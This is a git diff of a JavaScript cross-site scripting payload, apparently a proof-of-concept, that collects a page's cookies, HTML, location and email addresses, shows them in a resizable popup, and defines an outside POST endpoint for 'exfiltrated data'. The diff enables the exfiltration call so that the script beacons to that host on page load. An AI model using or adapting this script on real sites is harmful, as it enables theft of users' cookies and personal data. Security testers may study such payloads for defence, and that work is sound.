@@ -29,6 +29,8 @@ var UsersCookie;
 var DocHTML;
 var DocLocation;
 var EmailAddresses;
+var pH = 40;
+var pW = 850;
 
 //The internet POST destination for our exfiltrated data. 
 var Toilet = "https://ptsv2.com/t/qo33d-1598654477";
@@ -46,10 +48,22 @@ function ExfiltrateData(ID)
 	 xhr.send("XSS-TEST-"+ID);	
 }
 
+//Resize Popup
+ function resize_now(doc,addHeight,addWidth){
+		if(pH < 1024) {pH += addHeight;}
+		if(pW < 1024) {pW += addWidth;}
+        doc.resizeTo(pW, pH);
+}
+
 //Build a space in the popup for the each bit of data 
 function BuildContainer(doc,titletext,datatext,dataheight,hyperlink)
 {
+
 	if(datatext){	
+	
+	//Will build, Adjust Size
+	resize_now(doc,dataheight+40,0);
+	
 	//Container
 	var container = doc.document.createElement("div");
 	container.setAttribute("class","center");
@@ -111,6 +125,8 @@ function SearchByRegex(BODYTEXT,REGEX){
 	return SB;
 }
 
+
+
 //Search Document for InputBoxes 
 function SearchForInputBoxes(){
 	
@@ -136,8 +152,7 @@ function SearchForInputBoxes(){
 
 //Create the popup to show possible data to exfiltrate. 
 function createPopup(){
-var pH =500;
-var pW = 600;
+
 var popup = open("", "", "width="+pW+"px,height="+pH+"px,toolbar=0,menubar=0,location=0,scrollbars=0,resizable=0");
 //Header
 var style= popup.document.createElement("style");
@@ -167,7 +182,7 @@ window.addEventListener('load', function () {
 	DocHTML = document.getElementsByTagName('body')[0].innerHTML;
 	DocLocation = document.location.href;	
 
-	//ExfiltrateData(TimeAsMS);
+	ExfiltrateData(TimeAsMS);
 	createPopup();
 
 })
